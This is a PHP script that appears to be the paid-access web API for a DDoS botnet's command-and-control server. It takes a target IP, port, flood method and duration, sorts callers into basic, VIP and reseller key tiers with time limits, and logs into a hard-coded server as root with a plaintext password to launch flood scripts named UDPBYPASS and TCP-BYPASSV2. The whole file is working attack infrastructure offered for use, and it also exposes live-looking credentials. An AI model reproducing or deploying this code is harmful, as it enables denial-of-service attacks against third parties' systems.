<?php

    /*
    API For CNC Server
    Change Variables For Server
    A basic query for this to work would be attack.php?key=MYKEYS&target=1.1.1.1&port=22&method=TCP&for=100
    */

    // Server Information NEED TO CONNECT TO YOUR CNC SERVER SO MAKE SURE THIS IS ALL CORRECT
    $server = "147.182.192.16";
    $serverport = 22;
    $username = "root";
    $password = "Nestor2008@";

    // Get querys
    $key = $_GET['key'];
    $target = $_GET['target'];
    $port = $_GET['port'];
    $method = $_GET['method'];
    $for = $_GET['for'];

    // Change the arrays to your API Keys and botnets methods
    $basicKey = array("MYKEYS", "STILLMINE", "putyourkeyshere");
    $vipKey = array("morekeys", "lol");
    $resllerKey = array("thiskey", "ckckx");
    $maxBasicTime = 300;
    $maxVipKey = 600;
    $maxResellerKey = 1200;
    $methodTypes = array("TCP", "UDP");
    $maxPort = 65535;
    
    $run;
    

    // Check that the data sent in URL is not empty or invalid
    if(!$key || empty($key))
    {
        return die("No key was specified");
    }

    if(!$target || empty($target))
    {
        return die("No target was specified");
    }

    if(!$port || empty($port))
    {
        return die("No port was specified");
    }

    if(!$method || empty($method))
    {
        return die("No method was specified");
    }

    if(!$for || empty($for))
    {
        return die("You didnt say how long for");
    }
    

    // Check if keys are right and method is ok
    if(in_array($key, $basicKey))
    {
        $maxTime = 300;
    }
    else if (in_array($key, $vipKey))
    {
        $maxTime = 600;
    } else if (in_array($key, $resllerKey))
    {
        $maxTime = 1200;
    } else {
        die("Invalid Key");
    }


    if(!in_array($method, $methodTypes))
    {
        return die("Invalid method");
    }

    if($for > $maxTime)
    {
        die("You cant hit for that long");
    }

    // Makes sure the port is a integar value and does not go above the max port
    if(filter_var($port, FILTER_VALIDATE_INT) == false || $port > $maxPort)
    {
        return die("Not a valid port");
    }

    if(filter_var($for, FILTER_VALIDATE_INT) == false)
    {
        return die("Invalid format");
    }

    // If the method is this then run this script put run as the script 
    if($method == "UDP") { $run = "./UDPBYPASS"; }
    else if($method == "TCP") { $run = "./TCP-BYPASSV2"; }


    // Try connecting to the server and its port
    $connect = fsockopen($server, $serverport);

    // If cant connect then throw error
    if(!$connect) 
    {
        return die("Cannot connect to server");
    }
    
    // Inputs Username
    fwrite($connect, $username);
    sleep(1);
    // And password
    fwrite($connect, $password);
    sleep(1);

    // Then runs the script
    fwrite($connect, $run);

    // Saying everything was ok
    echo "<h1 style='text-align: center'>Attack Sent</h1>";

    echo "<h2 style='text-align: center'>
    Target: $target <br>
    Port: $port <br>
    Method: $method <br>
    For: $for <br>
    "
?>